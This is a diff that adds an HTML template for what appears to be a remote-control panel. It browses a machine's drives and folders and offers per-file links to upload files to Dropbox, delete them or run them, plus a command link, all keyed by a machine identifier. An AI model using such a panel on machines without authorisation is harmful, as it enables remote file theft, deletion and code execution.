@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+<title>Dir %4\</title>
+<script src="/prototype.js" type="text/javascript"></script>
+<script type="text/javascript">
+
+</script>
+</head>
+<body id="body" style="font: 100% monospace">
+<div><a href="list">[LIST]</a></div>
+<div><a href="cmd?i=%1">[CMD]</a></div>
+<ul>
+<li><a href="dir?go=drive&i=%1">[DRIVES] </a></li>
+<li><a href="dir?go=path&path=%3&i=%1">[ROOT] %3</a></li>
+<li><a href="dir?go=path&path=%2&i=%1">[UP] ..</a></li>
+<li><b>%4\</b></li>
+%!%
+<li><a href="dir?go=path&path=%3&i=%1">[FOLDER] %2</a></li>
+
+%!%
+<li>%2 | %3 | modified %4 | accessed %5 | created %6 |
+<a href="cmd?cmd=PUT&path=%NPATH&url=%DBX&i=%1">[DROPBOX]</a> | <a href="cmd?cmd=DEL&path=%NPATH&i=%1">[DEL]</a> | <a href="cmd?cmd=RUN&path=%NPATH&i=%1">[RUN]</a> </li>
+
+%!%
+</ul>
+<div><a href="cmd?cmd=DIR&path=%2&i=%1">[RELOAD] %2</a></div>
+</body>
+
+</html>
